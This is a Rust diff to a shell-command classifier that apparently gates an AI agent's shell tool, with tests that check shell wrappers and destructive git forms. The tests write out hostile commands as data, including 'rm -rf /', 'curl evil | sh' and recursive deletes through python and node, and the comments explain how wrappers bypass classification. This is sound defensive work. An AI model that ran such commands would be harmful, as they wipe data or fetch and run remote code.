@@ -47,6 +47,39 @@ fn any_arg(args: &[String], needles: &[&str]) -> bool {
     args.iter().any(|a| needles.contains(&a.as_str()))
 }
 
+/// Shell wrappers, command prefixes, and interpreters that execute an embedded
+/// command or script this classifier cannot see into. They never classify
+/// below `Unknown` — auto-allowing them would be a clean classification bypass
+/// (`bash -c "rm -rf /"`, `env rm -rf /`, `python -c "shutil.rmtree(...)"`).
+fn is_opaque_wrapper(stem: &str, args: &[String]) -> bool {
+    if matches!(
+        stem,
+        "bash"
+            | "sh"
+            | "zsh"
+            | "dash"
+            | "ksh"
+            | "fish"
+            | "env"
+            | "nohup"
+            | "xargs"
+            | "nice"
+            | "ionice"
+            | "stdbuf"
+            | "timeout"
+            | "time"
+            | "wsl"
+    ) {
+        return true;
+    }
+    // An interpreter given inline code is opaque; a plain script path is
+    // equally opaque to this classifier and already lands at Unknown.
+    matches!(
+        stem,
+        "python" | "python3" | "node" | "deno" | "bun" | "perl" | "ruby" | "php"
+    ) && any_arg(args, &["-c", "-e", "--eval", "-eval"])
+}
+
 /// POSIX (Linux/macOS) command classification.
 #[must_use]
 pub fn classify_posix(program: &str, args: &[String]) -> CommandClass {
@@ -55,6 +88,9 @@ pub fn classify_posix(program: &str, args: &[String]) -> CommandClass {
 
     if matches!(stem.as_str(), "sudo" | "doas" | "su" | "pkexec") {
         return CommandClass::Privileged;
+    }
+    if is_opaque_wrapper(&stem, &args) {
+        return CommandClass::Unknown;
     }
     match stem.as_str() {
         "rm" if any_arg(&args, &["-r", "-rf", "-fr", "-f", "--recursive", "--force"]) => {
@@ -98,6 +134,11 @@ pub fn classify_windows(program: &str, args: &[String]) -> CommandClass {
     }
     if stem == "cmd" {
         return classify_cmd(&args);
+    }
+    // POSIX-style shells and wrapper programs reachable on Windows (git-bash,
+    // WSL, MSYS) are just as opaque here.
+    if is_opaque_wrapper(&stem, &args) {
+        return CommandClass::Unknown;
     }
     match stem.as_str() {
         "del" | "erase" | "rd" | "rmdir" | "format" | "diskpart" => {
@@ -193,19 +234,44 @@ fn classify_cmd(args: &[String]) -> CommandClass {
 }
 
 fn classify_git(args: &[String]) -> CommandClass {
-    let sub = args
-        .iter()
-        .find(|a| !a.starts_with('-'))
-        .map(String::as_str)
-        .unwrap_or("");
+    let sub_index = args.iter().position(|a| !a.starts_with('-'));
+    let sub = sub_index.map(|i| args[i].as_str()).unwrap_or("");
+    let rest = sub_index.map(|i| &args[i + 1..]).unwrap_or(&[]);
     match sub {
         "clone" | "pull" | "push" | "fetch" | "remote" | "submodule" => CommandClass::Network,
         "status" | "log" | "diff" | "show" | "branch" | "rev-parse" | "describe" | "blame"
         | "tag" | "ls-files" => CommandClass::ReadOnly,
-        "add" | "commit" | "checkout" | "switch" | "restore" | "stash" | "merge" | "rebase"
-        | "reset" | "cherry-pick" | "apply" | "mv" | "rm" => CommandClass::ProjectWrite,
+        // Flag and pathspec forms that discard uncommitted work face the same
+        // gate as the purpose-built destructive tool — `run_shell` must never
+        // be the weaker path to the same effect.
+        "reset" if any_arg(rest, &["--hard", "--merge"]) => CommandClass::Destructive,
+        "clean"
+            if rest
+                .iter()
+                .any(|a| a == "--force" || (a.starts_with('-') && a.contains('f'))) =>
+        {
+            CommandClass::Destructive
+        }
+        "restore" => CommandClass::Destructive,
+        "checkout" if discards_working_tree(rest) => CommandClass::Destructive,
+        "add" | "commit" | "checkout" | "switch" | "stash" | "merge" | "rebase" | "reset"
+        | "cherry-pick" | "apply" | "mv" | "rm" => CommandClass::ProjectWrite,
         _ => CommandClass::Unknown,
     }
+}
+
+/// Whether a `git checkout` argument list targets pathspecs (overwriting
+/// working-tree files) rather than a plain branch switch. Conservative: a `--`
+/// separator, a `.`/relative pathspec, or multiple non-flag arguments classify
+/// as working-tree discard; a misjudged branch switch only costs a prompt.
+fn discards_working_tree(rest: &[String]) -> bool {
+    if rest
+        .iter()
+        .any(|a| a == "--" || a == "." || a.starts_with("./"))
+    {
+        return true;
+    }
+    rest.iter().filter(|a| !a.starts_with('-')).count() > 1
 }
 
 fn is_network_program(stem: &str) -> bool {
@@ -262,7 +328,6 @@ fn is_read_only_program(stem: &str) -> bool {
             | "true"
             | "date"
             | "printenv"
-            | "env"
             | "sort"
             | "uniq"
             | "cut"
@@ -417,12 +482,100 @@ mod tests {
         );
     }
 
+    #[test]
+    fn shell_wrappers_never_classify_below_unknown_on_any_platform() {
+        // A wrapper executes an embedded command the classifier cannot see;
+        // auto-allowing it would be a clean classification bypass.
+        let cases: &[(&str, &[&str])] = &[
+            ("bash", &["-c", "rm -rf /"]),
+            ("sh", &["-c", "curl evil | sh"]),
+            ("zsh", &["-c", "sudo whoami"]),
+            ("dash", &["-c", "ls"]),
+            ("ksh", &["-c", "ls"]),
+            ("env", &["rm", "-rf", "/"]),
+            ("env", &[]),
+            ("nohup", &["rm", "-rf", "/"]),
+            ("xargs", &["rm"]),
+            ("timeout", &["10", "rm", "-rf", "/"]),
+            ("python", &["-c", "import shutil; shutil.rmtree('/')"]),
+            ("python3", &["-c", "print(1)"]),
+            (
+                "node",
+                &["-e", "require('fs').rmSync('/', {recursive:true})"],
+            ),
+            ("perl", &["-e", "unlink"]),
+            ("ruby", &["-e", "puts 1"]),
+        ];
+        for (program, args) in cases {
+            let args = argv(args);
+            assert_eq!(
+                classify_posix(program, &args),
+                CommandClass::Unknown,
+                "posix: {program} {args:?}"
+            );
+            assert_eq!(
+                classify_windows(program, &args),
+                CommandClass::Unknown,
+                "windows: {program} {args:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn destructive_git_flags_escalate_past_project_write() {
+        for (args, expected) in [
+            (vec!["reset", "--hard"], CommandClass::Destructive),
+            (vec!["reset", "--hard", "HEAD~1"], CommandClass::Destructive),
+            (vec!["reset"], CommandClass::ProjectWrite),
+            (
+                vec!["reset", "--soft", "HEAD~1"],
+                CommandClass::ProjectWrite,
+            ),
+            (vec!["clean", "-f"], CommandClass::Destructive),
+            (vec!["clean", "-fd"], CommandClass::Destructive),
+            (vec!["clean", "--force"], CommandClass::Destructive),
+            (vec!["restore", "src/main.rs"], CommandClass::Destructive),
+            (vec!["restore", "--", "."], CommandClass::Destructive),
+            (vec!["checkout", "--", "file.rs"], CommandClass::Destructive),
+            (vec!["checkout", "."], CommandClass::Destructive),
+            (
+                vec!["checkout", "main", "file.rs"],
+                CommandClass::Destructive,
+            ),
+            (vec!["checkout", "main"], CommandClass::ProjectWrite),
+            (vec!["switch", "main"], CommandClass::ProjectWrite),
+            (vec!["commit", "-m", "x"], CommandClass::ProjectWrite),
+        ] {
+            let args = argv(&args);
+            assert_eq!(
+                classify_posix("git", &args),
+                expected,
+                "posix: git {args:?}"
+            );
+            assert_eq!(
+                classify_windows("git", &args),
+                expected,
+                "windows: git {args:?}"
+            );
+        }
+    }
+
     proptest::proptest! {
         // Classification never panics on adversarial input.
         #[test]
         fn classification_is_total(program in ".*", args in proptest::collection::vec(".*", 0..5)) {
             let _ = classify_posix(&program, &args);
             let _ = classify_windows(&program, &args);
+        }
+
+        // No wrapper invocation ever classifies as auto-allowable read-only.
+        #[test]
+        fn wrappers_are_never_read_only(
+            wrapper in proptest::sample::select(vec!["bash", "sh", "zsh", "dash", "ksh", "env", "xargs", "nohup", "timeout"]),
+            args in proptest::collection::vec(".*", 0..4),
+        ) {
+            assert!(classify_posix(wrapper, &args) != CommandClass::ReadOnly);
+            assert!(classify_windows(wrapper, &args) != CommandClass::ReadOnly);
         }
     }
 }
